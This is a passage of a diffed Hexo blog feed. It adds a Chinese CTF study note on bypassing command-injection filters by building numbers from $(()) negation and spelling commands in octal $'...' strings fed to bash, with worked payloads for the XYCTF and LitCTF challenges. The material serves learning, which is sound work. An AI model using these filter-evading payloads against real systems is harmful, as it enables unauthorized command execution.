-<h5 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h5><h6 id="XYCTF-2024-ezRCE"><a href="#XYCTF-2024-ezRCE" class="headerlink" title="XYCTF 2024 - ezRCE"></a>XYCTF 2024 - ezRCE</h6><p>题目源码：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$white_list</span> = [<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;9&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;&lt;&#x27;</span>]; </span><br><span class="line">    <span class="variable">$cmd_char</span> = <span class="title function_ invoke__">str_split</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$cmd_char</span> <span class="keyword">as</span> <span class="variable">$char</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$char</span>, <span class="variable">$white_list</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;really ez?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$cmd</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$cmd</span>=<span class="title function_ invoke__">waf</span>(<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]);</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">really ez?</span><br></pre></td></tr></table></figure>
-
-<p>就是考的八进制数据，没有禁<code>&#39;</code>，先尝试直接<code>ls</code>，</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#x27;\154\163&#x27;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603180726080.png" alt="image-20240603180726080"></p>
-<p>读取根目录（<code>ls /</code>），可以如下构造：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls / ==&gt;$&#x27;\154\163\40\57&#x27;</span><br><span class="line">$0&lt;&lt;&lt;\$0\&lt;\&lt;\&lt;\$\&#x27;\\154\\163\\40\\57\&#x27;</span><br><span class="line">防止转义</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603180945707.png" alt="image-20240603180945707"></p>
-<p>最后读flag：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /f*</span><br><span class="line">$0&lt;&lt;&lt;$&#x27;\143\141\164\40\57\146\52&#x27;</span><br></pre></td></tr></table></figure>
-
-<p>读到flag</p>
-<p>但是正如常用的<code>bash&lt;&lt;&lt;...</code>这道题还可以尝试构造<code>bash</code>，如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#x27;\142\141\163\150&#x27;&lt;&lt;&lt;$&#x27;\143\141\164\40\57\146\52&#x27;</span><br></pre></td></tr></table></figure>
-
-<p>也可以成功读到flag。</p>
-<p>注意知识点的融汇贯通。</p>
-<p>其他的题可以看看</p>
-<p><a href="https://ctf-show.feishu.cn/docx/EH72dMi3hoBtLJxDydjcIVcQnSc">CTFshow-周末大挑战官方wp</a></p>
-]]></content>
-      <categories>
-        <category>rce</category>
-        <category>rce之利用shell变量</category>
-      </categories>
-  </entry>
-  <entry>
     <title>python沙箱逃逸</title>
     <url>/2024/06/02/python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/</url>
     <content><![CDATA[<p>沙箱是一种安全机制，用于在受限制的环境中运行未信任的程序或代码。它的主要目的是防止这些程序或代码影响宿主系统或者访问未授权的数据。</p>
@@ -2979,6 +2568,494 @@
       <categories>
         <category>Python漏洞</category>
         <category>python沙箱逃逸</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>rce之利用shell变量</title>
+    <url>/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/</url>
+    <content><![CDATA[<h3 id="rce-‘新’进阶"><a href="#rce-‘新’进阶" class="headerlink" title="rce ‘新’进阶"></a>rce ‘新’进阶</h3><p>现在稍微大型的比赛都不会考那些已经算是比较常见、常用、简单的绕过如简单的取反、自增等，需要进阶学习纪录一下。此为学习者笔记,还是<strong>强调知识点融会贯通</strong></p>
+<span id="more"></span>
+
+<h3 id="命令执行之构造数字"><a href="#命令执行之构造数字" class="headerlink" title="命令执行之构造数字"></a>命令执行之构造数字</h3><h5 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h5><p><strong>在linux中<code>$(())</code>用于算术运算</strong>，在这个表达式中，你可以放入任何想要计算的运算式。</p>
+<p>先看下面这个式子：</p>
+<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240602213327932.png" alt="image-20240602213327932"></p>
+<p>这个式子中并没有给出任何具体的运算内容，系统默认执行了一个空的算数运算。所以在没有明确运算目标的情况下，**<code>$(())</code>返回的默认值是0**。（同时注意，个人认为，注意看payload以及执行情况，<code>$(())</code>本生就会执行后返回结果，不需要套一个<code>eval()</code>这种类似的执行函数）</p>
+<p>看看给了的正常的运算符</p>
+<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240602214355554.png" alt="image-20240602214355554"></p>
+<p>重点来了，尝试将上面那个0取反<br><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240602214522539.png" alt="image-20240602214522539"></p>
+<p>得到-1，那么再取反一次<code>-2</code>看看<br><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240602214739811.png" alt="image-20240602214739811"></p>
+<p>这里又得到了1，linux中的取反操作时针对二进制进行的，那么现在就可以通过相加减获得数字。</p>
+<p>比如想要获得1，就可以像上面一样构造，如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo $((~$(($((~$(())))+$((~$(())))))))</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240602215641095.png" alt="image-20240602215641095"></p>
+<p>现在想要构造就很简单了，比如又想构造<code>2</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo $(($((~$(($((~$(())))+$((~$(())))))))+$((~$(($((~$(())))+$((~$(())))))))))</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240602215758986.png" alt="image-20240602215758986"></p>
+<p>这样就可以构造任意数字。</p>
+<p><strong>同时注意加号在某些情况下可以省略</strong>（建议在去掉+号前先看看没去+号是什么样子的），比如那个生成1的payload</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">原：</span><br><span class="line">echo $((~$(($((~$(())))+$((~$(())))))))</span><br><span class="line"></span><br><span class="line">去掉+号后</span><br><span class="line">echo $((~$(($((~$(())))$((~$(())))))))  如下图</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240602222226786.png" alt="image-20240602222226786"></p>
+<p>成功执行。</p>
+<p>但是注意，为什么要加某些情况下呢，比如下面这个测试：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo $(($((~$(($((~$(())))+$((~$(())))))))+$((~$(($((~$(())))+$((~$(())))))))))</span><br><span class="line">生成2的payload，那么现在将+去掉，如下：</span><br><span class="line">echo $(($((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))))))))</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240602222408309.png" alt="image-20240602222408309"></p>
+<p>这里生成的却是11，嘿嘿，这是怎么回事，注意看这个payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$(($((~$(($((~$(())))+$((~$(())))))))+$((~$(($((~$(())))+$((~$(())))))))))</span><br><span class="line"></span><br><span class="line">先像上面那个1那样只去掉构造出1的+号，再看看执行结果，如下：</span><br><span class="line">$(($((~$(($((~$(())))$((~$(())))))))+$((~$(($((~$(())))$((~$(())))))))))</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240602222634293.png" alt="image-20240602222634293"></p>
+<p>成功得到2，那么为什么将中间那个<code>+</code>去掉就不对了呢，个人认为是符号判定的问题，用代码表示一下去掉<code>+</code>后的情况：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$(( $((~$(($((~$(())))$((~$(()))))))) $((~$(($((~$(())))$((~$(()))))))) ))</span><br></pre></td></tr></table></figure>
+
+<p>用空格分隔了一下，注意看</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$((~$(($((~$(())))$((~$(())))))))  已经符合一个完整的格式，会得到1，那么两个1就会得到11，这就是为什么可以得到11的原因</span><br></pre></td></tr></table></figure>
+
+<p>那么现在来和之前生成1的payload对比一下（同样用空格分隔）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$(( ~$(($((~$(()))) $((~$(()))))) ))</span><br></pre></td></tr></table></figure>
+
+<p>这样并不能形成一个完整的可计算的格式，故只能类似之前那样有个<code>+</code>，所以这里的<code>+</code>号可以省略，而那个2不能。</p>
+<p><strong>那么如果遇到过滤<code>+</code>号的题</strong>，2该如何构造呢，注意看：</p>
+<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240602223600280.png" alt="image-20240602223600280"></p>
+<p>尝试一下构造<code>-3</code>，如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1: $((~$(())))</span><br><span class="line"></span><br><span class="line">echo $((~$(($((~$(())))+$((~$(())))+$((~$(())))))))</span><br><span class="line">可以直接得到2，看了一下构造，应该是可以去掉+号的，尝试一下：</span><br><span class="line">echo $((~$(($((~$(())))$((~$(())))$((~$(()))))))) ,成功</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240602223942848.png" alt="image-20240602223942848"></p>
+<p>多尝试，看构造，较重要</p>
+<h5 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h5><p>LitCTF2024 - 百万美元的诱惑</p>
+<p>开题：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$a</span> !== <span class="variable">$b</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$c</span>) &amp;&amp; <span class="variable">$c</span> &gt; <span class="number">2024</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;好康的&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;干巴爹干巴爹先辈~&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;开胃小菜))&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>简单的绕过，payload如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?a[]=1&amp;b[]=2&amp;c=2025a</span><br></pre></td></tr></table></figure>
+
+<p>然后给了第二关<code>/dollar.php</code>，代码如下：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag in 12.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;x&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$x</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;x&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z0-9;`|#&#x27;\&quot;%&amp;\x09\x0a&gt;&lt;.,?*\-=\\[\]]/i&quot;</span>, <span class="variable">$x</span>))&#123;</span><br><span class="line">            <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat &quot;</span>.<span class="variable">$x</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p>正好对应这个知识点，构造如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-13取反为12</span><br><span class="line"></span><br><span class="line">$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</span><br></pre></td></tr></table></figure>
+
+<p>直接抓包后传进去即可</p>
+<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240610184944008.png" alt="image-20240610184944008"></p>
+<h3 id="利用shell脚本变量构造命令"><a href="#利用shell脚本变量构造命令" class="headerlink" title="利用shell脚本变量构造命令"></a>利用shell脚本变量构造命令</h3><p>这个思路最早提出于2017年34c3CTF里的<a href="https://medium.com/@orik_/34c3-ctf-minbashmaxfun-writeup-4470b596df60">minbashmaxfun</a>，随后2020安洵杯也有<a href="https://xz.aliyun.com/t/12242?time__1311=mqmhD5YIMD7GkDlc+EvPQqOQbDkDfg2TD&alichlgref=https://www.bing.com/#toc-2">Web-Bash-Vino0o0o</a></p>
+<p><strong>探姬师傅有个项目应该是可以尝试一把梭的</strong>，好文好项目推送：<code>https://github.com/ProbiusOfficial/bashFuck?tab=readme-ov-file</code></p>
+<p>还有bash的参考手册：<code>https://www.gnu.org/software/bash/manual/bash.html</code></p>
+<h4 id="启程"><a href="#启程" class="headerlink" title="启程"></a>启程</h4><p>这一板块去跟一下最早的<a href="https://medium.com/@orik_/34c3-ctf-minbashmaxfun-writeup-4470b596df60">文章</a>。</p>
+<p><strong>这道题允许的字符串<code>$()#!&#123;&#125;&lt;\’,</code></strong></p>
+<p>这里说明一下相关变量：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">（1）$# -参数数量-单独使用结果为0</span><br><span class="line">（2）$&#123;##&#125; -计数变量（#）长度，这里的结果为1</span><br><span class="line">（3）$((expr)) -算术表达式</span><br><span class="line">（4）&lt;&lt;&lt; -这是Bash shell语言中的重定向符，将一个变量或者字符串重定向到命令的标准输入（即wc -w &lt;&lt;&lt; &quot;H&quot;等价于echo &quot;H&quot; | wc -w）</span><br><span class="line">（5）$&#123;!var&#125; -间接引用</span><br><span class="line">（6）$&#x27;\123&#x27; -将八进制转换为字符串文字中的字符</span><br><span class="line">（7）&#123;a,b&#125; -花括号扩展</span><br></pre></td></tr></table></figure>
+
+<p><strong>这里补充说明一下</strong>：</p>
+<ul>
+<li>对（5）的间接引用的说明，直接给shell测试代码：</li>
+</ul>
+<p>haha.sh:</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">var1=&quot;hello&quot;</span><br><span class="line">var2=&quot;var1&quot;</span><br><span class="line">echo $&#123;!var2&#125;</span><br></pre></td></tr></table></figure>
+
+<p>再运行：</p>
+<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603023300478.png" alt="image-20240603023300478"></p>
+<p>可以看到这里输出的是hello，这就是间接引用的定义。</p>
+<ul>
+<li>对（6）的补充说明，如下：</li>
+</ul>
+<p>一个小小的前置知识，看完理解一下就行。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls ==》 $&#x27;\154&#x27;$&#x27;\163&#x27; 这样是可以直接使用的</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603153444204.png" alt="image-20240603153444204"></p>
+<p>就是<code>$&#39;&#39;</code>会直接执行生成，所以交给编译器的是ls，也就会执行。</p>
+<p><strong>再进行组合运用一下：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$(($&#123;##&#125;&lt;&lt;$&#123;##&#125;)) - 1左移1，结果为2 位运算，与二进制的运算相关</span><br><span class="line">$&#123;!#&#125; - 执行 bash（因为第一个参数是 /bin/bash），可以在本地输出看看</span><br><span class="line">$((2#100)) -将二进制转换为十进制</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="开始构造"><a href="#开始构造" class="headerlink" title="开始构造"></a>开始构造</h5><p>先尝试<code>ls</code>，**<code>l</code>对应八进制为0154，<code>s</code>对应的八进制为0163。**</p>
+<p><strong>先用八进制表示，<code>$&#39;\154&#39;$&#39;\163&#39;</code>,个人发现<code>$&#39;\154\163&#39;</code>也可以表示<code>ls</code>，</strong>这里先跟文章，然后再尝试自己构造发现的同样表示ls的方法。</p>
+<p>注意组合运用那里<code>$((2#100))</code>可以将二进制100转换为十进制数4，采用这个思路来构造出整数，</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">154二进制数 : 0b10011010</span><br><span class="line">163二进制数 : 0b10100011</span><br></pre></td></tr></table></figure>
+
+<p>那么现在就用<code>$#</code>（0）和<code>$</code>（1）来替换里面的数字，如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">154二进制数 ：$&#123;##&#125;$#$#$&#123;##&#125;$&#123;##&#125;$#$&#123;##&#125;$#</span><br><span class="line">163二进制数 ：$&#123;##&#125;$#$&#123;##&#125;$#$#$#$&#123;##&#125;$&#123;##&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这样就可以构造出二进制的数。</p>
+<p>那么此时就需要构造出前面的2，<strong>此时再看组合运用那里</strong>，<code>$(($&lt;&lt;$))</code>这样不就构造出2了吗，最终效果如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">154：$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$#$&#123;##&#125;$&#123;##&#125;$#$&#123;##&#125;$#))</span><br><span class="line">同理</span><br><span class="line">163：$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$&#123;##&#125;$#$#$#$&#123;##&#125;$&#123;##&#125;))</span><br></pre></td></tr></table></figure>
+
+<p>这时再套入<code>$&#39;&#39;</code>，即（<code>$&#39;\154&#39;$&#39;\163&#39;</code>），如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">先看正常包裹：</span><br><span class="line">$&#x27;\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$#$&#123;##&#125;$&#123;##&#125;$#$&#123;##&#125;$#))&#x27;$&#x27;\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$&#123;##&#125;$#$#$#$&#123;##&#125;$&#123;##&#125;))&#x27;</span><br><span class="line">这样并不能成功，请注意。估计就是套外面的特殊符号被当作字符串从而转义了，这里就需要在特殊符号前面加一个\防止被转义。</span><br><span class="line">那么再次尝试如下：</span><br><span class="line">\$\&#x27;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$#$&#123;##&#125;$&#123;##&#125;$#$&#123;##&#125;$#))\&#x27;\$\&#x27;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$&#123;##&#125;$#$#$#$&#123;##&#125;$&#123;##&#125;))\&#x27;</span><br><span class="line">输出看看</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603125450576.png" alt="image-20240603125450576"></p>
+<p>但是注意，这个构造出来的<code>$&#39;\154&#39;$&#39;\163&#39;</code><strong>只会被当做字符串，并不会被当作命令执行再次执行从而形成ls</strong>，也就是说这里的<code>$&#39;&#39;</code>并没有起作用，本来它可以自己执行从而生成ls的，为什么不继续解析可以看看这个<a href="https://www.freebuf.com/articles/system/361101.html">文章</a>，可以在终端直接传，结果如下：<br><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603125825756.png" alt="image-20240603125825756"></p>
+<p>显示没有这个命令，那么此时我们就需要将这个传入bash使得这个被解析为<code>ls</code>，<strong>这次就可以利用到<code>&lt;&lt;&lt;</code>这个重定向符</strong>，如下格式：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash &lt;&lt;&lt; \$\&#x27;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$#$&#123;##&#125;$&#123;##&#125;$#$&#123;##&#125;$#))\&#x27;\$\&#x27;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$&#123;##&#125;$#$#$#$&#123;##&#125;$&#123;##&#125;))\&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>这样就可以成功构造出ls，再传入的时候就可以被执行，但是这道题这里要求无字母，此时就<strong>可以用到间接扩展<code>$0</code>，单独使用在linux中对应bash</strong>，但是这道题不能有数字，看组合运用那里，就可以像这样：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;!#&#125; &lt;&lt;&lt; \$\&#x27;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$#$&#123;##&#125;$&#123;##&#125;$#$&#123;##&#125;$#))\&#x27;\$\&#x27;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$&#123;##&#125;$#$#$#$&#123;##&#125;$&#123;##&#125;))\&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>很怪的就是本地测试当中<code>bash&lt;&lt;&lt;.....</code>可以执行，但是<code>$0</code>和<code>$&#123;!#&#125;</code>都不能成功执行，报错如下：</p>
+<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603135658082.png" alt="image-20240603135658082"></p>
+<p><strong>怪？？？，怎么回事，可能是宝塔linux环境的问题吧，多尝试，注意看题目要求。</strong></p>
+<p>这里再用centos跑一下：</p>
+<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603204933409.png" alt="image-20240603204933409"></p>
+<p>成功，这样就可以构造出没有数字字母的<code>ls</code>的payload了。</p>
+<p><strong>那么继续深入</strong>，比如读flag（<code>cat /flag</code>）或者查看根目录（<code>ls /</code>），<strong>尝试直接利用</strong>一下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls / ==&gt; $&#x27;\154\163\40\57&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603141433189.png" alt="image-20240603141433189"></p>
+<p>注意看，这里构造出来后被<code>ls /</code>被当作了整个字符串处理，而不是命令，这是怎么回事，<strong>这是因为<code>bash</code>是用空格分隔参数，这个方法（<code>$&#39;&#39;</code>）处理完的结果会导致整个结果都被当做了字符串（包括这里的空格）</strong>，这就导致了不能被正常解析为命令。解决方法如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">要先给bash来参数分离一下，</span><br><span class="line">bash &lt;&lt;&lt; $&#x27;\154\163\40\57&#x27;   </span><br><span class="line">即可成功执行，还有问题的话就如这种格式尝试&#123;ls,/&#125;，注意&#123;ls,/&#125;也不能像之前ls那样直接利用，与ls /同样的问题。</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>再来看看文章的问题</strong></p>
+<p>在传入时有效的做到了以下几点：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash&lt;&lt;&lt;&quot;&#x27;ls -l&#x27;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>却报错</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash: line 1: ls -l: command not found</span><br></pre></td></tr></table></figure>
+
+<p>看到这里我测试了一下，如下传参是可以执行的：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash&lt;&lt;&lt;&quot;ls /&quot;</span><br></pre></td></tr></table></figure>
+
+<p>我就在想为什么要这样在里面套一对单引号，本来以为是多此一举，想了一下，可能是构造出来的payload在转化完后就是这样的，事实胜于雄辩，直接构造一下看看结果：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls /  ：$&#x27;\154\163\40\57&#x27;  这次这样构造一下</span><br><span class="line">相对应的二进制数为：0b10011010，0b10100011，0b101000 和 0b111001</span><br><span class="line">分别为 $&#123;##&#125;$#$#$&#123;##&#125;$&#123;##&#125;$#$&#123;##&#125;$# $&#123;##&#125;$#$&#123;##&#125;$#$#$#$&#123;##&#125;$&#123;##&#125; $&#123;##&#125;$#$&#123;##&#125;$#$#$# $&#123;##&#125;$&#123;##&#125;$&#123;##&#125;$#$#$&#123;##&#125;</span><br><span class="line">再二进制转十进制，如下：</span><br><span class="line">2:   $(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))</span><br><span class="line">154: $(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$#$&#123;##&#125;$&#123;##&#125;$#$&#123;##&#125;$#))</span><br><span class="line">163: $(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$&#123;##&#125;$#$#$#$&#123;##&#125;$&#123;##&#125;))</span><br><span class="line">40:  $(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$&#123;##&#125;$#$#$#))</span><br><span class="line">57:  $(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;$#$#$&#123;##&#125;))</span><br></pre></td></tr></table></figure>
+
+<p>那么现在如下构造：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">先完成最前面提出的问题，试试$&#x27;\154\163&#x27;能不能使用，如下：</span><br><span class="line">\$\&#x27;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$#$&#123;##&#125;$&#123;##&#125;$#$&#123;##&#125;$#))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$&#123;##&#125;$#$#$#$&#123;##&#125;$&#123;##&#125;))\&#x27;</span><br><span class="line">结合前面的问题，如下测试：</span><br><span class="line">bash&lt;&lt;&lt;\$\&#x27;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$#$&#123;##&#125;$&#123;##&#125;$#$&#123;##&#125;$#))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$&#123;##&#125;$#$#$#$&#123;##&#125;$&#123;##&#125;))\&#x27;  成功执行ls</span><br><span class="line"></span><br><span class="line">同时注意bash&lt;&lt;&lt;&quot;&#x27;ls&#x27;&quot; 